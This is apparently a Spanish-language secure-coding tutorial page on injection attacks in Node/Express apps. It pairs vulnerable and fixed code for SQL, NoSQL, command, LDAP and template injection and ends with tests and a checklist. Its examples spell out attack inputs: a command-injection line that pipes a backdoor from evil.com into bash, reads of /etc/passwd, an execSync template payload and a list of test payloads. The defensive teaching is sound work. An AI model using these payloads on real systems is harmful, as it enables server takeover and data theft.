---
sidebar_position: 4
title: "Injection Attacks"
---

## 2. Injection Attacks

### 2.1 ¿Qué es una inyección?

Ocurre cuando un atacante puede insertar código malicioso en una consulta o comando que la aplicación ejecuta.

### 2.2 SQL Injection (aunque usamos MongoDB)

Ejemplo vulnerable en SQL:

```javascript
// ❌ VULNERABLE
app.get('/user', (req, res) => {
  const userId = req.query.id;
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// Ataque: GET /user?id=1 OR 1=1
// Resultado: Devuelve TODOS los usuarios
```

**Solución**: Usar prepared statements o ORMs

```javascript
// ✅ SEGURO
app.get('/user', (req, res) => {
  const userId = req.query.id;
  const query = 'SELECT * FROM users WHERE id = ?';
  db.query(query, [userId], (err, results) => {
    res.json(results);
  });
});
```

### 2.3 NoSQL Injection (MongoDB)

MongoDB también es vulnerable a inyecciones:

```javascript
// ❌ VULNERABLE
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await User.findOne({
    username: username,
    password: password
  });
  
  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false });
  }
});

// Ataque con:
// { "username": "admin", "password": { "$ne": null } }
// Esto busca usuarios donde password != null
```

**Solución**: Sanitizar entradas y usar operadores seguros

```javascript
// ✅ SEGURO
import mongoSanitize from 'express-mongo-sanitize';

app.use(mongoSanitize()); // Middleware que elimina $ y .

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Validar que sean strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  const user = await User.findOne({
    username: username,
    password: hashPassword(password) // Nunca guardes passwords en texto plano
  });
  
  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false });
  }
});
```

### **2.4 Command Injection** 💻

**Descripción**: Ejecutar comandos del sistema operativo es **extremadamente peligroso** si incluye input del usuario.

**¿Por qué es crítico?**
- Acceso completo al servidor
- Puede ejecutar cualquier comando (rm, wget, curl, etc.)
- Bypass completo de seguridad de la aplicación
- Instalación de backdoors

#### Código Vulnerable

```javascript
// ❌ VULNERABLE: exec con input del usuario
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Construye comando con string concatenation
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// Ataque: GET /ping?host=google.com;whoami
// Ejecuta: ping -c 4 google.com;whoami
// Resultado: Muestra el usuario del servidor

// Ataque: GET /ping?host=google.com;cat /etc/passwd
// Resultado: Expone usuarios del sistema

// Ataque: GET /ping?host=google.com;curl http://evil.com/backdoor.sh|bash
// Resultado: Descarga y ejecuta backdoor
```

**Caracteres peligrosos en shell**:
```
;  # Separador de comandos
&  # Ejecuta comando en background
|  # Pipe (encadena comandos)
`  # Command substitution
$  # Variable expansion
>  # Redirección
<  # Redirección input
\n # Nueva línea (múltiples comandos)
&&  # AND lógico
||  # OR lógico
```

#### Prevención

**1. Usar librerías específicas (MEJOR opción)**

```javascript
// ✅ SEGURO: Librería específica para ping
import ping from 'ping';
import validator from 'validator';

app.get('/ping', async (req, res) => {
  const host = req.query.host;
  
  // Validar que es dominio o IP válida
  if (!validator.isFQDN(host) && !validator.isIP(host)) {
    return res.status(400).json({ error: 'Invalid host format' });
  }
  
  try {
    const result = await ping.promise.probe(host, {
      timeout: 10,
      extra: ['-c', '4'], // Argumentos seguros
    });
    res.json({
      host: result.host,
      alive: result.alive,
      time: result.time,
    });
  } catch (error) {
    res.status(500).json({ error: 'Ping failed' });
  }
});
```

**2. Si DEBES usar exec, usar execFile con argumentos**

```javascript
import { execFile } from 'child_process';
import validator from 'validator';

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  if (!validator.isFQDN(host) && !validator.isIP(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }
  
  // execFile NO ejecuta shell, pasa argumentos directamente
  execFile('ping', ['-c', '4', host], (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: 'Ping failed' });
    }
    res.send(stdout);
  });
});

// Ataque: GET /ping?host=google.com;whoami
// execFile NO interpreta ; como separador de comandos
// Intenta hacer ping a "google.com;whoami" (falla, no ejecuta whoami)
```

**3. Whitelist de opciones permitidas**

```javascript
const ALLOWED_COMMANDS = {
  'git-status': ['git', ['status']],
  'git-branch': ['git', ['branch']],
  'npm-version': ['npm', ['--version']],
};

app.post('/execute', (req, res) => {
  const { command } = req.body;
  
  const allowedCommand = ALLOWED_COMMANDS[command];
  
  if (!allowedCommand) {
    return res.status(400).json({ error: 'Command not allowed' });
  }
  
  const [executable, args] = allowedCommand;
  
  execFile(executable, args, (error, stdout) => {
    if (error) {
      return res.status(500).json({ error: error.message });
    }
    res.json({ output: stdout });
  });
});
```

---

### **2.5 LDAP Injection**

**Descripción**: Similar a SQL injection pero en queries LDAP (Active Directory, OpenLDAP).

```javascript
// ❌ VULNERABLE
const ldap = require('ldapjs');

app.post('/ldap-search', (req, res) => {
  const { username } = req.body;
  
  const filter = `(uid=${username})`;
  // Ataque: username = "*)(uid=*" 
  // Filter: (uid=*)(uid=*)
  // Retorna TODOS los usuarios
  
  client.search('ou=users,dc=example,dc=com', { filter }, (err, search) => {
    // ...
  });
});

// ✅ SEGURO: Escapar caracteres especiales LDAP
function escapeLDAP(str) {
  return str.replace(/[\\*()\x00]/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16);
  });
}

app.post('/ldap-search', (req, res) => {
  const { username } = req.body;
  
  const safeUsername = escapeLDAP(username);
  const filter = `(uid=${safeUsername})`;
  
  client.search('ou=users,dc=example,dc=com', { filter }, (err, search) => {
    // ...
  });
});
```

---

### **2.6 Template Injection (SSTI)**

**Descripción**: Inyectar código en templates (Pug, EJS, Handlebars).

```javascript
// ❌ VULNERABLE: Renderiza template con input del usuario
const pug = require('pug');

app.get('/greeting', (req, res) => {
  const name = req.query.name;
  
  // Compila template con input del usuario
  const template = pug.compile(`h1 Hello #{name}`);
  const html = template({ name });
  res.send(html);
});

// Ataque: /greeting?name=#{process.mainModule.require('child_process').execSync('whoami')}
// Resultado: Ejecuta código en el servidor

// ✅ SEGURO: No compilar templates dinámicamente
const pug = require('pug');

// Template predefinido, NO del usuario
const template = pug.compileFile('./views/greeting.pug');

app.get('/greeting', (req, res) => {
  const name = req.query.name;
  
  // Pasar solo DATOS, no template
  const html = template({ name }); // Pug escapa automáticamente
  res.send(html);
});
```

---

## 🧪 Testing de Injection

```typescript
// tests/injection.test.ts
import request from 'supertest';
import app from '../app';

describe('Injection Protection', () => {
  describe('NoSQL Injection', () => {
    it('debe rechazar objetos en login', async () => {
      const res = await request(app)
        .post('/api/login')
        .send({
          username: { $ne: null },
          password: { $ne: null },
        });
      
      expect(res.status).toBe(400); // Validación rechaza objetos
    });
    
    it('debe sanitizar operadores MongoDB', async () => {
      const res = await request(app)
        .post('/api/search')
        .send({ query: { $where: "1==1" } });
      
      expect(res.status).toBe(400);
    });
  });
  
  describe('Command Injection', () => {
    const commandInjectionPayloads = [
      'google.com;whoami',
      'google.com|whoami',
      'google.com&whoami',
      'google.com`whoami`',
      'google.com$(whoami)',
    ];
    
    it('debe rechazar caracteres shell peligrosos', async () => {
      for (const payload of commandInjectionPayloads) {
        const res = await request(app)
          .get('/api/ping')
          .query({ host: payload });
        
        expect(res.status).toBe(400);
        expect(res.body.error).toContain('Invalid');
      }
    });
    
    it('debe aceptar dominios válidos', async () => {
      const res = await request(app)
        .get('/api/ping')
        .query({ host: 'google.com' });
      
      expect(res.status).toBe(200);
    });
  });
});
```

---

## 📋 Resumen: Checklist Anti-Injection

### SQL/NoSQL Injection
- [ ] **Usar ORMs/Query Builders** (Mongoose, Sequelize, Prisma)
- [ ] **Prepared statements** para SQL raw queries
- [ ] **express-mongo-sanitize** middleware instalado
- [ ] **Validar tipos** con Joi/Zod (rechazar objetos donde esperas strings)
- [ ] **No concatenar strings** para queries

### Command Injection
- [ ] **Evitar exec/eval** completamente si es posible
- [ ] **Usar librerías específicas** (ping, ssh2, etc.)
- [ ] **Si usas exec, usar execFile** con array de argumentos
- [ ] **Validar estrictamente** inputs (validator.js para URLs, IPs, etc.)
- [ ] **Whitelist de comandos** permitidos

### General
- [ ] **Principle of Least Privilege**: Usuario DB con permisos mínimos
- [ ] **Input validation**: Validar SIEMPRE en servidor
- [ ] **Sanitización**: express-mongo-sanitize, DOMPurify, etc.
- [ ] **Testing**: Tests automatizados con payloads de injection
- [ ] **WAF**: Web Application Firewall en producción (Cloudflare, AWS WAF)

:::danger Nunca Confíes en el Cliente
La validación del cliente **NO es seguridad**. Un atacante puede:
- Desactivar JavaScript
- Modificar requests con DevTools/Burp Suite
- Enviar requests directamente con curl/Postman

**SIEMPRE valida en el servidor**.
:::

:::tip ORMs No Son Mágicos
Mientras Mongoose/Sequelize previenen SQL injection en queries normales, aún debes:
- Sanitizar inputs
- Validar tipos
- No usar `$where` con input del usuario
- Evitar `eval` en agregaciones
:::
```
